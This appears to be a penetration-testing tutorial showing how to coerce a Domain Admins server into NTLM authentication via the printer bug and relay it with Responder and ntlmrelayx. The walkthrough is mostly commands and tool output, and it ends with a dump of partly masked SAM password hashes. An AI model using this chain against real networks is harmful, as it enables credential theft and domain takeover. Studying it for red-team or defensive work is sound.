in this tutorial there is a spesific configuration exploited. During search of "Domain Admins" group i found one of the server machine is member of this group. So we will use spoolsample to force this machine to authenticate our server and relay request to another machine. Normally there should be authentication error but since machine is member of "Domain Admins" authentication succeed.

Machine in "Domain Admins" Group

![image](https://user-images.githubusercontent.com/13157446/133656582-f251b85d-13e3-48c5-baef-1964e1aaad23.png)


Responder HTTP and SMB server should be disabled


	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ cat /etc/responder/Responder.conf 
	[Responder Core]

	; Servers to start
	SQL = On
	SMB = Off
	RDP = On
	Kerberos = On
	FTP = On
	POP = On
	SMTP = On
	IMAP = On
	HTTP = Off
	HTTPS = On
	DNS = On
	LDAP = On
	.......

Start Responder

	┌──(kali㉿kali)-[~/krbrelayx]
	└─$ sudo responder -I eth0 -rv                                                                                                                                130 ⨯
											 __
	  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
	  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
	  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
					   |__|

			   NBT-NS, LLMNR & MDNS Responder 3.0.6.0

	  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
	  To kill this script hit CTRL-C


	[+] Poisoners:
		LLMNR                      [ON]
		NBT-NS                     [ON]
		DNS/MDNS                   [ON]

	[+] Servers:
		HTTP server                [OFF]
		HTTPS server               [ON]
		WPAD proxy                 [OFF]
		Auth proxy                 [OFF]
		SMB server                 [OFF]
		Kerberos server            [ON]
		SQL server                 [ON]
		FTP server                 [ON]
		IMAP server                [ON]
		POP3 server                [ON]
		SMTP server                [ON]
		DNS server                 [ON]
		LDAP server                [ON]
		RDP server                 [ON]
		DCE-RPC server             [ON]
		WinRM server               [ON]

	[+] HTTP Options:
		Always serving EXE         [OFF]
		Serving EXE                [OFF]
		Serving HTML               [OFF]
		Upstream Proxy             [OFF]

	[+] Poisoning Options:
		Analyze Mode               [OFF]
		Force WPAD auth            [OFF]
		Force Basic Auth           [OFF]
		Force LM downgrade         [OFF]
		Fingerprint hosts          [OFF]

	[+] Generic Options:
		Responder NIC              [eth0]
		Responder IP               [RelayServer]
		Challenge set              [random]
		Don't Respond To Names     ['ISATAP']

	[+] Current Session Variables:
		Responder Machine Name     [.....]
		Responder Domain Name      [...]
		Responder DCE-RPC Port     [....]

	[+] Listening for events...                   


Start Relay Server

	┌──(impacket)─(kali㉿kali)-[~/ntlmrelay-adcs/impacket]
	└─$ examples/ntlmrelayx.py -t TargetMachine.Domain_name.intra -smb2support              
	Impacket v0.9.24.dev1+20210815.200803.5fd22878 - Copyright 2021 SecureAuth Corporation

	[*] Protocol Client DCSYNC loaded..
	[*] Protocol Client IMAPS loaded..
	[*] Protocol Client IMAP loaded..
	[*] Protocol Client LDAP loaded..
	[*] Protocol Client LDAPS loaded..
	[*] Protocol Client SMTP loaded..
	[*] Protocol Client MSSQL loaded..
	[*] Protocol Client HTTPS loaded..
	[*] Protocol Client HTTP loaded..
	[*] Protocol Client RPC loaded..
	[*] Protocol Client SMB loaded..
	[*] Running in relay mode to single host
	[*] Setting up SMB Server
	[*] Setting up HTTP Server
	[*] Setting up WCF Server

	[*] Servers started, waiting for connections
	
	
Exploit Spooler vulnerability and for to authenticate your relay server

	┌──(kali㉿kali)-[~/krbrelayx]
	└─$ python3 printerbug.py Domain_name.intra/User@VulnerableMachine.Domain_name.intra RelayServer 
	[*] Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	Password:
	[*] Attempting to trigger authentication via rprn RPC at VulnerableMachine.Domain_name.intra
	[*] Bind OK
	[*] Got handle
	RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
	[*] Triggered RPC backconnect, this may or may not have worked
	

Check NTLM Relay Server

	┌──(impacket)─(kali㉿kali)-[~/ntlmrelay-adcs/impacket]
	└─$ examples/ntlmrelayx.py -t TargetMachine.Domain_name.intra -smb2support              
	Impacket v0.9.24.dev1+20210815.200803.5fd22878 - Copyright 2021 SecureAuth Corporation

	[*] Protocol Client DCSYNC loaded..
	[*] Protocol Client IMAPS loaded..
	[*] Protocol Client IMAP loaded..
	[*] Protocol Client LDAP loaded..
	[*] Protocol Client LDAPS loaded..
	[*] Protocol Client SMTP loaded..
	[*] Protocol Client MSSQL loaded..
	[*] Protocol Client HTTPS loaded..
	[*] Protocol Client HTTP loaded..
	[*] Protocol Client RPC loaded..
	[*] Protocol Client SMB loaded..
	[*] Running in relay mode to single host
	[*] Setting up SMB Server
	[*] Setting up HTTP Server
	[*] Setting up WCF Server

	[*] Servers started, waiting for connections
	[*] SMBD-Thread-4: Connection from Domain_name/VulnerableMachine$@VulnerableMachineip controlled, attacking target smb://TargetMachine.Domain_name.intra
	[*] Authenticating against smb://TargetMachine.Domain_name.intra as Domain_name/VulnerableMachine$ SUCCEED
	[*] SMBD-Thread-4: Connection from Domain_name/VulnerableMachine$@VulnerableMachineip controlled, but there are no more targets left!
	[*] Service RemoteRegistry is in stopped state
	[*] Starting service RemoteRegistry
	[*] Target system bootKey: 0x35f88c89**********68
	[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
	Administrator:500:aad3b435b51*****435b51404ee:a68b*a7a**800f96bda2::*:*
	Guest:501:aad3b435b51404e********4ee:31d6cfe0d*16ae9**********e0c089c0:::
	DefaultAccount:503:aad3b435b51404ee********1404ee:31d6cfe********73c59d7e0c089c0:::
	SecretAdmin:1002:aad3b435b51404********04ee:adeb2001********f25bebc6540f:::
	[*] Done dumping SAM hashes for host: TargetMachine.Domain_name.intra
	[*] Stopping service RemoteRegistry
                                                                         
